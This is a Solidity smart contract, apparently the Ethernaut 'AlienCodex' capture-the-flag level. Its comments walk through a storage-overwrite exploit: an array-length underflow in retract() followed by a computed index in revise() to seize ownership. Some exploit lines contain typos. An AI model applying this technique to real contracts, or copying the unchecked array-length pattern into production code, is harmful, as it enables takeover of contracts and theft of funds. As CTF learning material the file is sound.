// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  //Using console we first call this function to make contact 
  //using await contract.make_contact()
  //we can check the data in this slot 
  //using await web3.eth.getstorageAt(contract.address, 0, console.log)
  function make_contact() public {
    contact = true;
  }
  
  // we can now access the other functions
  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }
  
  // we then use await contract.retract()
  //this triggers an underflow that send us to the last address in the storage array.
  //for dynmamic array position is found using keccak256(k.p)
  //p = webb3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"][1]))
  //i = Bigint(2**256) - Bigint(p)
  //content = '0x' + '0' . repeat(24) + player.slice(2)
  //contract.revise(i, content, {from: player, gas: 90000})
  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

